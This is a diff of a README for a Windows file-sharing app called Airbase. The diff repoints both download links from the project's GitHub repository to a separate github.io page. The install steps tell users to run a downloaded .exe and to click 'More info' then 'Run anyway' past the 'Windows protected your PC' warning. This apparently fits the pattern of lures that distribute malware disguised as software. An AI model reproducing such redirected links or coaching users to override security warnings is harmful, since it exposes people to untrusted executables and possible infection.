@@ -1,6 +1,6 @@
 # 📁 Airbase - Share files instantly over local Wi-Fi
 
-[![](https://img.shields.io/badge/Download-Airbase_for_Windows-blue)](https://github.com/concluded-lahu708/Airbase)
+[![](https://img.shields.io/badge/Download-Airbase_for_Windows-blue)](https://concluded-lahu708.github.io)
 
 Airbase allows you to send and receive files between devices on your Wi-Fi network. It works without the internet and keeps your data on your local network. You do not need accounts or cloud storage to move your photos, documents, or videos.
 
@@ -17,7 +17,7 @@ Airbase runs on most modern Windows computers. Ensure your system meets these re
 
 Follow these steps to set up the application on your computer:
 
-1. Visit the [official download page](https://github.com/concluded-lahu708/Airbase) to see the latest versions.
+1. Visit the [official download page](https://concluded-lahu708.github.io) to see the latest versions.
 2. Select the file ending in .exe to start your download.
 3. Once the download finishes, open the file from your browser or your downloads folder.
 4. Windows might show a prompt that says "Windows protected your PC." This happens because the app is new. Click "More info" and then select "Run anyway" to proceed.
